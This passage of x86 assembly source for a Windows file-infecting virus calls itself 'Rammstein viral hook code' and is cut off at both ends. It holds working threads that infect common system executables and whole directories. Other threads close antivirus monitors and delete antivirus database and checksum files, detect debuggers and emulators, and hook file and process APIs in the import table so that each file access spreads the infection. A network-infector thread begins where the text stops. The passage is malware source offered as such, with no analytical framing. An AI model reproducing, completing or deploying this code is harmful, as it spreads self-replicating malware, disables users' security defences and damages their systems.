       mov [ebp+free_routine], NOT_AVAILABLE       ;
       call InfectFile                             ;Infect it!!
       pop edi                                     ;
       mov [ebp+free_routine], AVAILABLE           ;
                                                   ;
next_direct:                                       ;
       @endsz                                      ;go to end of string
       jmp direct_loop                             ;and do it again...
       ENDIF                                       ;
                                                   ;
direct_end:                                        ;
       lea esi, [ebp+offset direct_list]           ;point names again and
       mov ecx, direct_list_len                    ;restore encryption
       call not_list                               ;
                                                   ;
       IF THREAD1SEH                               ;
       jmp restore_thread1_seh                     ;host
                                                   ;
Thread1Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover1                          ;
DeltaRecover1:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover1               ;
                                                   ;
restore_thread1_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;release the semaphore
       call [ebp+_ExitThread], 0                   ;
Thread_1_StartAddress endp                         ;
                                                   ;
direct_list:                                       ;the direct action list
       IF DEBUG                                    ;if debug is on only
       noter <L>                                   ;
       noter <DGoat*.*>                            ;goat files will be
       ELSE                                        ;infected...
       noter <L>                                   ;
       noter <Cdplayer.exe>                        ; Like CD music?
       noter <Notepad.exe>                         ; Like to write stuff?
       noter <Wordpad.exe>                         ; Like to write better?<g>
       noter <Calc.exe>                            ; Like to calculate?
       noter <DrWatson.exe>                        ; Fear the errors?
       noter <Extrac32.exe>                        ; Like to extract?
       noter <Mplayer.exe>                         ; Like mpegs?
       noter <MsHearts.exe>                        ; Like stupid games?
       noter <WinMine.exe>                         ; And more stupid games?
       noter <Sol.exe>                             ; And still more stupid?
       noter <SndVol32.exe>                        ; Like to adjust yer vol?
       noter <WinHlp32.exe>                        ; Are you using help?
       ENDIF                                       ; Well... TO BAD !!!! ;-)
direct_list_len = $ - offset direct_list           ;
       db 0FFh                                     ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the directory infector thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_2_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread2Delta                          ;
@Thread2Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread2Delta               ;
                                                   ;
       IF THREAD2SEH                               ;
       lea eax, [ebp+Thread2Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;Get the drive type. If
       call [ebp+_GetDriveTypeA]                   ;it is a fixed drive
       sub [ebp+crt_dir_flag], eax                 ;than this value = 0
                                                   ;
       push 260                                    ;Get Windows directory
       call @1                                     ;
wdir   db 260 dup(0)                               ;
@1:    call [ebp+_GetWindowsDirectoryA]            ;
                                                   ;
       push 260                                    ;Get System directory
       call @2                                     ;
sysdir db 260 dup(0)                               ;
@2:    call [ebp+_GetSystemDirectoryA]             ;
                                                   ;
       call @3                                     ;Get current directory
crtdir db 260 dup(0)                               ;
@3:    push 260                                    ;
       call [ebp+_GetCurrentDirectoryA]            ;
                                                   ;
       cmp dword ptr [ebp+crt_dir_flag], 0         ;are we on a fixed disk?
       jne direct_to_windows                       ;
                                                   ;
       mov dword ptr [ebp+infections], 0FFFFh      ;infect all files there
       call Infect_Directory                       ;
                                                   ;
direct_to_windows:                                 ;
       cmp [ebp+firstgen], 1                       ;
       je back_to_current_dir                      ;
                                                   ;
       lea eax, [ebp+offset wdir]                  ;Change to Windows dir.
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
                                                   ;
       mov dword ptr [ebp+infections], 3           ;infect 3 files there
       call Infect_Directory                       ;
                                                   ;
       lea eax, [ebp+offset sysdir]                ;Change to System dir.
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
                                                   ;
       mov dword ptr [ebp+infections], 3           ;infect 3 files there
       call Infect_Directory                       ;
                                                   ;
back_to_current_dir:                               ;
       lea eax, [ebp+offset crtdir]                ;Change back to crt dir.
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
                                                   ;
       IF THREAD2SEH                               ;
       jmp restore_thread2_seh                     ;host
                                                   ;
Thread2Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover2                          ;
DeltaRecover2:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover2               ;
                                                   ;
restore_thread2_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
infections   dd 0                                  ;
crt_dir_flag dd 3                                  ;
                                                   ;
Infect_Directory proc                              ;directory scanner
       pusha                                       ;
       lea esi, [ebp+file_extensions]              ;restore filenames
       mov ecx, file_extensions_len                ;
       call not_list                               ;
       inc esi                                     ;
       inc esi                                     ;
                                                   ;
find_first_file:                                   ;
       cmp byte ptr [esi], 0FFh                    ;last?
       je done_directory                           ;
       lea edi, [ebp+offset W32FD]                 ;find first!!
       call [ebp+_FindFirstFileA], esi, edi        ;
       mov edx, eax                                ;
                                                   ;
compare_result:                                    ;
       cmp eax, INVALID_HANDLE_VALUE               ;
       je next_extension                           ;
       or eax, eax                                 ;
       je next_extension                           ;
       push edi                                    ;
       lea edi, [edi.WFD_cFileName]                ;point name...
@002:  cmp [ebp+free_routine], NOT_AVAILABLE       ;syncronize!!!
       je @002                                     ;
       mov [ebp+free_routine], NOT_AVAILABLE       ;
       call InfectFile                             ;infect it!
       mov [ebp+free_routine], AVAILABLE           ;
       pop edi                                     ;
       jc find_next_file                           ;
       dec [ebp+infections]                        ;
       cmp [ebp+infections], 0                     ;
       jz done_directory                           ;
                                                   ;
find_next_file:                                    ;
       push edx                                    ;
       call [ebp+_FindNextFileA], edx, edi         ;find next
       pop edx                                     ;
       jmp compare_result                          ;
                                                   ;
next_extension:                                    ;
       @endsz                                      ;
       jmp find_first_file                         ;
                                                   ;
done_directory:                                    ;
       lea esi, [ebp+file_extensions]              ;recrypt the extenstions
       mov ecx, file_extensions_len                ;
       call not_list                               ;
       popa                                        ;
       ret                                         ;
Infect_Directory endp                              ;
                                                   ;
file_extensions:                                   ;the list with valid
       IF DEBUG                                    ;
       noter <L>                                   ;
       noter <GOAT*.EXE>                           ;extensions
       noter <GOAT*.COM>                           ;
       noter <GOAT*.ACM>                           ;
       noter <GOAT*.CPL>                           ;
       noter <GOAT*.HDI>                           ;
       noter <GOAT*.OCX>                           ;
       noter <GOAT*.PCI>                           ;
       noter <GOAT*.QTC>                           ;
       noter <GOAT*.SCR>                           ;
       noter <GOAT*.X32>                           ;
       noter <GOAT*.CNV>                           ;
       noter <GOAT*.FMT>                           ;
       noter <GOAT*.OCM>                           ;
       noter <GOAT*.OLB>                           ;
       noter <GOAT*.WPC>                           ;
       ELSE                                        ;extensions
       noter <L>                                   ;
       noter <*.EXE>                               ;normal exe
       noter <*.COM>                               ;same
       noter <*.ACM>                               ;
       noter <*.CPL>                               ;control panel object
       noter <*.HDI>                               ;heidi file
       noter <*.OCX>                               ;windowz ocx
       noter <*.PCI>                               ;
       noter <*.QTC>                               ;
       noter <*.SCR>                               ;screen saver
       noter <*.X32>                               ;
       noter <*.CNV>                               ;
       noter <*.FMT>                               ;
       noter <*.OCM>                               ;
       noter <*.OLB>                               ;
       noter <*.WPC>                               ;
       ENDIF                                       ;
file_extensions_len = $-offset file_extensions     ;
       db 0FFh                                     ;
Thread_2_StartAddress endp                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the AV monitors and checksums killer thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_3_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread3Delta                          ;
@Thread3Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread3Delta               ;
                                                   ;
       IF THREAD3SEH                               ;
       lea eax, [ebp+Thread3Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       IF ANTIAV                                   ;
       lea esi, [ebp+av_monitors]                  ;First kill some monitors
       mov ecx, monitors_nr                        ;
                                                   ;
LocateMonitors:                                    ;
       push ecx                                    ;
       call [ebp+_FindWindowA], 0, esi             ;
       xchg eax, ecx                               ;
       jecxz get_next_monitor                      ;
       call [ebp+_PostMessageA], ecx, WM_ENDSESSION, 0, 0
                                                   ;
get_next_monitor:                                  ;
       @endsz                                      ;
       pop ecx                                     ;
       loop LocateMonitors                         ;
                                                   ;
       lea esi, [ebp+offset av_list]               ;point av files list
       mov ecx, av_list_len                        ;and
       call not_list                               ;restore names...
       inc esi                                     ;
       inc esi                                     ;
       lea edi, [ebp+offset searchfiles]           ;point to Search Record
                                                   ;
locate_next_av:                                    ;
       mov eax, esi                                ;
       cmp byte ptr [eax], 0FFh                    ;is this the end?
       je av_kill_done                             ;
       push edi                                    ;push search rec. address
       push eax                                    ;push filename address
       call [ebp+_FindFirstFileA]                  ;find first match
       inc eax                                     ;
       jz next_av_file                             ;
       dec eax                                     ;
       push eax                                    ;
       lea ebx, [edi.WFD_cFileName]                ;ESI = ptr to filename
       push 80h                                    ;
       push ebx                                    ;
       call [ebp+_SetFileAttributesA]              ;
       push ebx                                    ;push filename address
       call [ebp+_DeleteFileA]                     ;delete file!
                                                   ;
       call [ebp+_FindClose]                       ;close the find handle
                                                   ;
next_av_file:                                      ;
       @endsz                                      ;
       jmp locate_next_av                          ;
                                                   ;
av_kill_done:                                      ;
       lea esi, [ebp+offset av_list]               ;point av files list
       mov ecx, av_list_len                        ;
       call not_list                               ;hide names...
       ENDIF                                       ;
                                                   ;
       IF THREAD3SEH                               ;
       jmp restore_thread3_seh                     ;host
                                                   ;
Thread3Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover3                          ;
DeltaRecover3:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover3               ;
                                                   ;
restore_thread3_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
Thread_3_StartAddress endp                         ;
av_monitors label                                  ;
            db 'AVP Monitor', 0                    ;
            db 'Amon Antivirus Monitor', 0         ;
monitors_nr = 2                                    ;
                                                   ;
searchfiles WIN32_FIND_DATA <?>                    ;
                                                   ;
av_list label                                      ;
       noter <L>                                   ;
       noter <AVP.CRC>                             ;the av files to kill
       noter <IVP.NTZ>                             ;
       noter <Anti-Vir.DAT>                        ;
       noter <CHKList.MS>                          ;
       noter <CHKList.CPS>                         ;
       noter <SmartCHK.MS>                         ;
       noter <SmartCHK.CPS>                        ;
       noter <AVG.AVI>                             ;
       noter <NOD32.000>                           ;
       noter <DRWEBASE.VDB>                        ;
       noter <AGUARD.DAT>                          ;
       noter <AVGQT.DAT>                           ;
       noter <LGUARD.VPS>                          ;
av_list_len = $ - offset av_list                   ;
        db 0FFh                                    ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the anti-debugging and anti-emulation thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_4_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread4Delta                          ;
@Thread4Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread4Delta               ;
                                                   ;
       IF THREAD4SEH                               ;
       lea eax, [ebp+Thread4Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       IF ANTIEMU                                  ;
       lea eax, [ebp+DebuggerKill]                 ;antidebugging stuffs.
       push eax                                    ;Here we set up a new
       xor ebx, ebx                                ;seh frame and then we
       push dword ptr fs:[ebx]                     ;make an exception error
       mov fs:[ebx], esp                           ;occur.
       dec dword ptr [ebx]                         ;TD stops here if in
                                                   ;default mode.
       jmp shut_down                               ;
                                                   ;
DebuggerKill:                                      ;
       mov esp, [esp+8]                            ;the execution goes here
       pop dword ptr fs:[0]                        ;
       add esp, 4                                  ;
                                                   ;
       db 0BDh                                     ;delta gets lost so we
delta2 dd 0                                        ;must restore it...
                                                   ;
       call @7                                     ;here we try to retrieve
       db 'IsDebuggerPresent', 0                   ;IsDebuggerPresent API
@7:    push [ebp+k32]                              ;if we fail it means we
       call [ebp+_GetProcAddress]                  ;don't have this api
       or eax, eax                                 ;(Windows95)
       jz continue_antiemu                         ;
                                                   ;
       call eax                                    ;Let's check if our
       or eax, eax                                 ;process is being
       jne shut_down                               ;debugged.
                                                   ;
       mov ecx, fs:[20h]                           ; ECX = Context of debugger
       jecxz softice                               ; If ECX<>0, we're debugged
       jmp shut_down                               ;
                                                   ;
softice:                                           ;
       lea edi, [ebp+SoftIce1]                     ;try to see if we are
       call detect_softice                         ;being debugged by
       jc shut_down                                ;softice
       lea edi, [ebp+SoftIce1]                     ;
       call detect_softice                         ;
       jc shut_down                                ;
       jmp nod_ice                                 ;
                                                   ;
detect_softice:                                    ;
       xor eax, eax                                ;
       push eax                                    ;
       push 00000080h                              ;
       push 00000003h                              ;
       push eax                                    ;
       inc eax                                     ;
       push eax                                    ;
       push 80000000h or 40000000h                 ;
       push edi                                    ;
       call [ebp+_CreateFileA]                     ;
                                                   ;
       inc eax                                     ;
       jz cantcreate                               ;
       dec eax                                     ;
                                                   ;
       push eax                                    ;
       call [ebp+_CloseHandle]                     ;
       stc                                         ;
       db 0c3h                                     ;
                                                   ;
cantcreate:                                        ;
       clc                                         ;
       db 0c3h                                     ;
                                                   ;
nod_ice:                                           ;
       cmp byte ptr [ebp+version], 4               ;can we use debug regs?
       jae cannot_kill_debug                       ;
                                                   ;
       lea esi, [ebp+drs]                          ;Debug Registers opcodes
       mov ecx, 7                                  ;7 registers
       lea edi, [ebp+bait]                         ;point the opcode place
                                                   ;
repp:                                              ;
       lodsb                                       ;take the opcode
       mov byte ptr [edi], al                      ;generate instruction
       call zapp                                   ;call it!
       loop repp                                   ;do it again
       jmp compute_now                             ;
                                                   ;
zapp:                                              ;
       xor eax, eax                                ;eax = 0
       dw 230fh                                    ;to mov DRx, eax
bait label                                         ;
       db 0                                        ;
       db 0C3h                                     ;
                                                   ;
drs db 0c0h, 0c8h, 0d0h, 0d8h, 0e8h, 0f0h, 0f8h    ;debug registers opcodes
                                                   ;
compute_now:                                       ;
       mov eax, dr0                                ;
       cmp eax, 0                                  ;
       jne shut_down                               ;
                                                   ;
cannot_kill_debug:                                 ;
       IF MMX                                      ;
       cmp [ebp+mmx], TRUE                         ;
       jne no_mmx_here                             ;
       mov ecx, 6666h                              ;do some loops
       mov eax, 1111h                              ;very lite mmx_usage
;      movd1 mm1, esi                              ;
;      movd1 eax, mm1                              ;
;      cmp eax, esi                                ;
;      jne shut_down                               ;
       ENDIF                                       ;
                                                   ;
no_mmx_here:                                       ;
       mov ebx, esp                                ;or by nod ice and
       push cs                                     ;others...
       pop eax                                     ;
       cmp esp, ebx                                ;
       jne shut_down                               ;
       jmp continue_antiemu                        ;
                                                   ;
shut_down:                                         ;
       IF DEBUG                                    ;
       call [ebp+_MessageBoxA], 0, offset debug, offset debug, 0
       ENDIF                                       ;
       push 0                                      ;If so, close down!!
       call [ebp+_ExitProcess]                     ;close
       IF DEBUG                                    ;
       debug  db 'Shut down by anti-emulator', 0   ;
       ENDIF                                       ;
continue_antiemu:                                  ;
       ELSE                                        ;
       ENDIF                                       ;
                                                   ;
       IF THREAD4SEH                               ;
       jmp restore_thread4_seh                     ;host
                                                   ;
Thread4Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover4                          ;
DeltaRecover4:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover4               ;
                                                   ;
restore_thread4_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
                                                   ;
SoftIce1 db "\\.\SICE",0                           ;
SoftIce2 db "\\.\NTICE",0                          ;
Thread_4_StartAddress endp                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the API hooker thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_5_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread5Delta                          ;
@Thread5Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread5Delta               ;
                                                   ;
       IF THREAD5SEH                               ;
       lea eax, [ebp+Thread5Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       cmp [ebp+skipper], 1                        ;
       je error                                    ;
                                                   ;
       IF APIHOOK                                  ;
       cmp [ebp+firstgen], 1                       ;don't hook gen0
       je error                                    ;
       mov ebx, dword ptr [ebp+ourimagebase]       ; now put imagebase in ebx
       mov esi, ebx                                ;
       mov ax, word ptr [esi]                      ;
       xor ax, ''                                ;
       cmp ax, 'ZM' xor ''                       ; check if it is an EXE
       jne error                                   ;
       mov esi, dword ptr [esi.MZ_lfanew]          ; get pointer to PE
       cmp esi, 1000h                              ; too far away?
       jae error                                   ;
       add esi, ebx                                ;
       mov ax, word ptr [esi]                      ;
       xor ax, '˚'                                ;
       cmp ax, 'EP' xor '˚'                       ; is it a PE?
       jne error                                   ;
       add esi, IMAGE_FILE_HEADER_SIZE             ; skip header
       mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       add edi, ebx                                ; and get import RVA
       mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
       add ecx, edi                                ; and import size
       mov eax, edi                                ; save RVA
                                                   ;
locate_module:                                     ;
       mov edi, dword ptr [edi.ID_Name]            ; get the name
       add edi, ebx                                ;
       push eax                                    ;
       mov eax, [edi]                              ;
       xor eax, '¯·˝'                             ;
       cmp eax, 'NREK' xor '¯·˝'                  ; and compare to KERN
       pop eax                                     ;
       je found_the_import_module                  ; if it is not that one
       add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
       mov edi, eax                                ;
       cmp edi, ecx                                ; but not beyond the size
       jae error                                   ; of the descriptor
       jmp locate_module                           ;
                                                   ;
found_the_import_module:                           ; if we found the kernel
       mov edi, eax                                ; import descriptor
       mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
       add esi, ebx                                ; addresses
       mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
       or edi, edi                                 ; no names? ;-(
       jz error                                    ;
       add edi, ebx                                ; names
       mov edx, functions_nr                       ;
                                                   ;
hooked_api_locate_loop:                            ;
       push edi                                    ; save pointer to names
       mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
       add edi, ebx                                ;
       add edi, 2                                  ; and skip the hint
                                                   ;
       push edi esi                                ; save these
       xchg edi, esi                               ;
       call StringCRC32                            ; eax = crc32
                                                   ;
       push edi ecx                                ;search them...
       lea edi,  [ebp+HookedFunctions]             ;
       mov ecx, functions_nr                       ;
                                                   ;
check:                                             ;
       cmp [edi], eax                              ;does it match?
       je found_it                                 ;
       add edi, 8                                  ;get next...
       loop check                                  ;
       jmp not_found                               ;
                                                   ;
found_it:                                          ;
       mov eax, [edi+4]                            ;get the new address
       mov [ebp+tempcounter], edi                  ;
       add eax, ebp                                ;and align to imagebase
       pop ecx edi                                 ;
       jmp found_one_api                           ;
                                                   ;
not_found:                                         ;
       pop ecx edi                                 ;
                                                   ;
       pop esi edi                                 ; otherwise restore
                                                   ;
       pop edi                                     ; restore arrays indexes
                                                   ;
api_next:                                          ;
       add edi, 4                                  ; and skip to next
       add esi, 4                                  ;
       cmp dword ptr [esi], 0                      ; 0? -> end of import
       je error                                    ;
       jmp hooked_api_locate_loop                  ;
                                                   ;
found_one_api:                                     ;
       pop esi                                     ; restore stack
       pop edi                                     ;
       pop edi                                     ;
                                                   ;
       pusha                                       ;
       mov edi, [ebp+tempcounter]                  ;
       mov ebx, [esi]                              ;
       lea eax, [ebp+offset HookedFunctions]       ;
       sub edi, eax                                ;
       mov ecx, 8                                  ;
       xchg eax, edi                               ;
       xor edx, edx                                ;
       div ecx                                     ;
       imul eax, eax, proc_len                     ;
       lea edi, [ebp+StartOfHooks]                 ;
       add edi, eax                                ;
       mov byte ptr [edi+5], 0E9h                  ;
       sub ebx, edi                                ;
       add ebx, 05h-0fh                            ;
       mov [edi+6], ebx                            ;
       popa                                        ;
                                                   ;
       mov [esi], eax                              ;save new api address!!!
       dec edx                                     ;did we find all?
       jz error                                    ;
       jmp api_next                                ;
       ENDIF                                       ;
                                                   ;
error:                                             ;
       mov [ebp+apihookfinish], 1                  ;
       IF THREAD5SEH                               ;
       jmp restore_thread5_seh                     ;host
                                                   ;
Thread5Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover5                          ;
DeltaRecover5:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover5               ;
                                                   ;
restore_thread5_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
Thread_5_StartAddress endp                         ;
                                                   ;
StartOfHooks label                                 ;
Hook_CopyFileA:                                    ;Here come the hook
      call Hooker                                  ;redirectors...
      jmp [ebp+_CopyFileA]                         ;
Hook_CopyFileExA:                                  ;
      call Hooker                                  ;
      jmp [ebp+_CopyFileExA]                       ;
Hook_CreateFileA:                                  ;
      call CreateFileHooker                        ;
      jmp [ebp+_CreateFileA]                       ;
Hook_GetCompressedFileSizeA:                       ;
      call Hooker                                  ;
      jmp [ebp+_GetCompressedFileSizeA]            ;
Hook_GetFileAttributesA:                           ;
      call Hooker                                  ;
      jmp [ebp+_GetFileAttributesA]                ;
Hook_GetFileAttributesExA:                         ;
      call Hooker                                  ;
      jmp [ebp+_GetFileAttributesExA]              ;
Hook_SetFileAttributesA:                           ;
      call Hooker                                  ;
      jmp [ebp+_SetFileAttributesA]                ;
Hook_GetFullPathNameA:                             ;
      call Hooker                                  ;
      jmp [ebp+_GetFullPathNameA]                  ;
Hook_MoveFileA:                                    ;
      call Hooker                                  ;
      jmp [ebp+_MoveFileA]                         ;
Hook_MoveFileExA:                                  ;
      call Hooker                                  ;
      jmp [ebp+_MoveFileExA]                       ;
Hook_OpenFile:                                     ;
      call Hooker                                  ;
      jmp [ebp+_OpenFile]                          ;
Hook_CreateProcessA:                               ;
      call Hooker                                  ;
      jmp [ebp+_CreateProcessA]                    ;
Hook_WinExec:                                      ;
      call Hooker                                  ;
      jmp [ebp+_WinExec]                           ;
Hook_DestroyWindow:                                ;
      call ExitProcessHooker                       ;
      jmp [ebp+_DestroyWindow]                     ;
Hook_ExitProcess:                                  ;
      call ExitProcessHooker                       ;
      jmp [ebp+_ExitProcess]                       ;
proc_len = $-Hook_ExitProcess                      ;
                                                   ;
Hooker proc                                        ;And this is our hook...
      pushad                                       ;
      pushfd                                       ;
                                                   ;
      call @HookerDelta                            ;
@HookerDelta:                                      ;
      pop ebp                                      ;
      sub ebp, offset @HookerDelta                 ;
                                                   ;
       IF VIRUSNOTIFYHOOK                          ;
       pusha                                       ;
       push 0                                      ;
       call hooktext1                              ;
       db 'Rammstein viral hook code!', 0          ;
hooktext1:                                         ;
       call hooktext2                              ;
       db 'Rammstein viral hook code!', 0          ;
hooktext2:                                         ;
       push 0                                      ;
       call [ebp+_MessageBoxA]                     ;
       popa                                        ;
       ENDIF                                       ;
                                                   ;
good_to_infect:                                    ;
       mov esi, [esp+2ch]                          ;
       push esi                                    ;
       call ValidateFile                           ;first validate the file
       pop edi                                     ;
       jc no_good_file                             ;
                                                   ;
@003:  cmp [ebp+free_routine], NOT_AVAILABLE       ;
       je @003                                     ;
       mov [ebp+free_routine], NOT_AVAILABLE       ;
       call InfectFile                             ;
       mov [ebp+free_routine], AVAILABLE           ;
                                                   ;
no_good_file:                                      ;
       popfd                                       ;
       popa                                        ;
       ret                                         ;
Hooker endp                                        ;
                                                   ;
ExitProcessHooker proc                             ;
       pusha                                       ;
       call ExitHookerEbp                          ;
ExitHookerEbp:                                     ;
       pop ebp                                     ;
       sub ebp, offset ExitHookerEbp               ;
                                                   ;
       mov [ebp+process_end], 1                    ;
@fo:   cmp [ebp+fileopen], TRUE                    ;we cannot allow shutdown
       je @fo                                      ;while our thread has a
       popa                                        ;file opened...
       ret                                         ;
ExitProcessHooker endp                             ;
                                                   ;
CreateFileHooker proc                              ;
       pusha                                       ;
       pushfd                                      ;
       call CreateFileEbp                          ;
CreateFileEbp:                                     ;
       pop ebp                                     ;
       sub ebp, offset CreateFileEbp               ;
       mov eax, [esp+2ch+4+4+4+4]                  ;
       cmp eax, OPEN_EXISTING                      ;
       je good_to_infect                           ;
                                                   ;
       popfd                                       ;
       popa                                        ;
       ret                                         ;
CreateFileHooker endp                              ;
                                                   ;
HookedFunctions:                                   ;
crc32 <CopyFileA>                                  ;
      dd offset Hook_CopyFileA                     ;
crc32 <CopyFileExA>                                ;
      dd offset Hook_CopyFileExA                   ;
crc32 <CreateFileA>                                ;
      dd offset Hook_CreateFileA                   ;
crc32 <GetCompressedFileSizeA>                     ;
      dd offset Hook_GetCompressedFileSizeA        ;
crc32 <GetFileAttributesA>                         ;
      dd offset Hook_GetFileAttributesA            ;
crc32 <GetFileAttributesExA>                       ;
      dd offset Hook_GetFileAttributesExA          ;
crc32 <SetFileAttributesA>                         ;
      dd offset Hook_SetFileAttributesA            ;
crc32 <GetFullPathNameA>                           ;
      dd offset Hook_GetFullPathNameA              ;
crc32 <MoveFileA>                                  ;
      dd offset Hook_MoveFileA                     ;
crc32 <MoveFileExA>                                ;
      dd offset Hook_MoveFileExA                   ;
crc32 <OpenFile>                                   ;
      dd offset Hook_OpenFile                      ;
crc32 <CreateProcessA>                             ;
      dd offset Hook_CreateProcessA                ;
crc32 <WinExec>                                    ;
      dd offset Hook_WinExec                       ;
crc32 <XDestroyWindow>                             ;
      dd offset Hook_DestroyWindow                 ;
crc32 <ExitProcess>                                ;
      dd offset Hook_ExitProcess                   ;
functions_nr = ($-offset HookedFunctions)/8        ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the Network Infector
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_6_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread6Delta                          ;
@Thread6Delta:                                     ;
       pop ebp                                     ;
